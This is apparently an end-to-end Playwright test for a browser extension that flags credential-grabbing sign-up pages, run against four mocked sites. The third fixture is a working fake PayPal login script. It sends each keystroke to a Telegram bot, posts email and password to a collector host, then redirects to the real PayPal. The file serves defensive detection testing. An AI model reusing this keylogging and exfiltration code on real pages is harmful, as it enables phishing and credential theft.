// End-to-end: loads dist/ in real Chromium and runs the dummy test against four pretend sites.
// No real network is touched: every URL is answered by the routes below.
const { chromium } = require("playwright");
const assert = require("node:assert/strict");
const path = require("node:path");
const DIST = path.resolve(__dirname, "../../dist");

const FORM = `<form id="f"><input type="email" name="email" placeholder="Email"><input type="password" name="password">
  <input type="tel" name="phone"><input name="cardnumber" autocomplete="cc-number"><button type="submit">Go</button></form>`;
const val = (n) => `document.querySelector('[name=${n}]').value`;

const SITES = {
  // 1. Honest: talks to itself, card goes to Stripe.
  "https://honest-shop.test/signup": `<title>Sign up</title>${FORM}<a href="/privacy">Privacy</a><a href="/contact">Contact us</a><p>Refund policy</p><script>
    f.addEventListener('submit', async (e) => { e.preventDefault();
      await fetch('/api/signup', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({email:${val("email")}, password:${val("password")}, phone:${val("phone")}})});
      await fetch('https://api.stripe.com/v1/tokens', {method:'POST', body:new URLSearchParams({'card[number]': ${val("cardnumber")}})});
      document.title = 'done'; });</script>`,

  // 2. Tracker-heavy: sends a SHA-256 of the email to an ad pixel when the field changes.
  "https://tracker-shop.test/join": `<title>Join</title>${FORM}<a href="/privacy">Privacy</a><script>
    document.querySelector('[name=email]').addEventListener('change', async (e) => {
      const h = [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(e.target.value.trim().toLowerCase())))].map(b=>b.toString(16).padStart(2,'0')).join('');
      fetch('https://www.facebook.com/tr?id=1&ev=Lead&ud[em]=' + h); });
    f.addEventListener('submit', (e) => { e.preventDefault(); fetch('/api/join', {method:'POST', body: JSON.stringify({email:${val("email")}})}).then(()=>document.title='done'); });</script>`,

  // 3. Grabber kit: keystroke exfil to a Telegram bot, password to a collector, then bounce to the real PayPal.
  "https://secure-login-verify.test/signin": `<title>PayPal - Log In</title>${FORM}<script>
    document.addEventListener('input', (e) => { fetch('https://api.telegram.org/bot123:AAA/sendMessage?chat_id=9&text=' + encodeURIComponent(e.target.name + '=' + e.target.value)); });
    f.addEventListener('submit', (e) => { e.preventDefault();
      fetch('https://collector-9.test/p.php', {method:'POST', body:new URLSearchParams({e:${val("email")}, p:${val("password")}})}).finally(() => { location.href = 'https://www.paypal.com/signin'; }); });</script>`,
  "https://www.paypal.com/signin": `<title>PayPal</title><form><input type="password" name="pw"><input name="otp" placeholder="Enter your one-time code"></form>`,

  // 4. Quiet: a plain old form POST to itself.
  "https://quiet-shop.test/register": `<title>Register</title><form id="f" action="/thanks" method="post"><input type="email" name="email"><input type="password" name="password"><input type="tel" name="phone"><button type="submit">Go</button></form>`,
  "https://quiet-shop.test/thanks": `<title>Thanks</title><p>Thanks!</p>`,
};

(async () => {
  const ctx = await chromium.launchPersistentContext("", {
    channel: "chromium", headless: true,
    args: [`--disable-extensions-except=${DIST}`, `--load-extension=${DIST}`],
  });
  const seen = []; // ground truth: every URL the pages really requested
  await ctx.route("**/*", (r) => {
    const req = r.request();
    const url = req.url();
    if (url.startsWith("chrome-extension://") || url.startsWith("data:")) return r.continue();
    seen.push(`${req.method()} ${url.split("?")[0]}`);
    const key = url.split("?")[0];
    const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*" };
    if (req.method() === "OPTIONS") return r.fulfill({ status: 204, headers: cors });
    if (SITES[key]) return r.fulfill({ contentType: "text/html", body: SITES[key] });
    return r.fulfill({ status: 200, contentType: "application/json", headers: cors, body: "{}" });
  });

  let [sw] = ctx.serviceWorkers();
  if (!sw) sw = await ctx.waitForEvent("serviceworker", { timeout: 15000 });
  const id = sw.url().split("/")[2];
  const popup = await ctx.newPage();
  await popup.goto(`chrome-extension://${id}/popup.html`);

  const newestTab = () => popup.evaluate(async () => Math.max(...(await chrome.tabs.query({})).map((t) => t.id)));
  const ask = (tabId, msg) => popup.evaluate(([t, m]) => chrome.runtime.sendMessage({ ...m, tabId: t }), [tabId, msg]);
  const toTab = (tabId, msg) => popup.evaluate(([t, m]) => chrome.tabs.sendMessage(t, m, { frameId: 0 }), [tabId, msg]);

  async function run(name, url, { arm = true, submit = true, wait = 900 } = {}) {
    const page = await ctx.newPage();
    await page.goto(url);
    await page.waitForTimeout(400);
    const tabId = await newestTab();
    let started = null;
    if (arm) started = await toTab(tabId, { type: "dummy:start" });
    if (submit) { await page.click("button[type=submit]"); await page.waitForTimeout(wait); }
    const st = await ask(tabId, { type: "dummy:state" });
    console.log(`\n== ${name}`);
    if (st.armed) {
      console.log(`   ${st.verdict.title} | ${st.verdict.sub}`);
      for (const i of st.verdict.items) console.log(`   [${i.severity}] ${i.text}`);
    } else console.log("   (not armed)");
    return { page, tabId, st, started };
  }

  const SHOTS = process.env.SHOTS_DIR;
  async function shot(name, tabId) {
    if (!SHOTS) return;
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 340, height: 700 });
    await p.goto(`chrome-extension://${id}/popup.html?tab=${tabId}`);
    await p.waitForTimeout(2600); // scan + age lookup + one dummy refresh
    await p.screenshot({ path: `${SHOTS}/${name}.png`, fullPage: true });
    await p.close();
  }

  let failed = 0;
  const check = (label, fn) => { try { fn(); console.log(`   ok   ${label}`); } catch (e) { failed++; console.log(`   FAIL ${label}\n        ${e.message.split("\n")[0]}`); } };

  // --- 0. dormant: nothing recorded when no test is running, and the page still works
  {
    const { page, st } = await run("Dormant (no test started)", "https://honest-shop.test/signup", { arm: false });
    check("not armed", () => assert.equal(st.armed, false));
    assert.equal(await page.title(), "done", "page did not finish its own submit handler with the hooks installed");
    console.log("   ok   page still works with hooks installed (its own submit handler finished)");
    await page.close();
  }

  // --- 1. honest
  {
    const { page, st, started, tabId: hTab } = await run("Honest shop", "https://honest-shop.test/signup");
    await shot("honest", hTab);
    check("filled fields", () => assert.ok(started.filled >= 4, `filled ${started.filled}`));
    check("verdict clean", () => assert.equal(st.verdict.status, "clean"));
    check("no strong/warn items", () => assert.equal(st.verdict.items.filter((i) => ["strong", "warn"].includes(i.severity)).length, 0));
    assert.equal(await page.title(), "done", "page did not finish its own submit handler");
    console.log("   ok   page JS completed (hooks didn't break it)");
    check("limit note always shown", () => assert.match(st.verdict.limit, /own servers/));
    await page.close();
  }

  // --- 2. tracker-heavy
  {
    const { page, st } = await run("Tracker-heavy shop", "https://tracker-shop.test/join");
    check("verdict clean (hashed email to a pixel is normal)", () => assert.equal(st.verdict.status, "clean"));
    check("pixel shown as info", () => assert.ok(st.verdict.items.some((i) => i.severity === "info" && /facebook\.com/.test(i.text) && /hash/.test(i.text))));
    await page.close();
  }

  // --- 3. grabber
  {
    const { page, st, tabId: gTab } = await run("Data grabber kit", "https://secure-login-verify.test/signin", { wait: 1500 });
    await shot("grabber", gTab);
    const txt = st.verdict.items.map((i) => `${i.severity}:${i.text}`).join("\n");
    check("verdict grabber", () => assert.equal(st.verdict.status, "grabber"));
    check("caught Telegram keystroke exfil before submit", () => assert.match(txt, /strong:.*api\.telegram\.org \(a Telegram bot\), before you pressed submit/));
    check("caught password sent to the collector", () => assert.match(txt, /strong:.*password.*collector-9\.test/i));
    check("caught bounce to the real PayPal", () => assert.match(txt, /strong:After you submitted, the site sent you to the real paypal site/));
    check("noticed the follow-up one-time-code ask", () => assert.match(txt, /warn:After you "logged in", the next page asked for a one-time code/));
    await page.close();
  }

  // --- 4. quiet
  {
    const { page, st } = await run("Quiet shop (plain form POST)", "https://quiet-shop.test/register");
    check("verdict clean", () => assert.equal(st.verdict.status, "clean"));
    check("only this site", () => assert.match(st.verdict.sub, /this site/));
    await page.close();
  }

  // --- 5. stop clears everything
  {
    const { page, tabId } = await run("Stop & clear", "https://honest-shop.test/signup", { submit: false });
    await ask(tabId, { type: "dummy:stop" });
    const st = await ask(tabId, { type: "dummy:state" });
    check("cleared after stop", () => assert.equal(st.armed, false));
    await page.close();
  }

  // --- ground truth: the pretend grabber really did send those requests
  console.log("\n== ground truth (requests the pages really made)");
  const tg = seen.filter((s) => /api\.telegram\.org/.test(s)).length;
  const col = seen.filter((s) => /collector-9\.test/.test(s)).length;
  console.log(`   telegram requests: ${tg}, collector requests: ${col}`);
  check("grabber really sent keystrokes + password", () => assert.ok(tg >= 3 && col >= 1));

  console.log(failed ? `\n${failed} FAILED` : "\nALL E2E CHECKS PASSED");
  await ctx.close();
  process.exit(failed ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
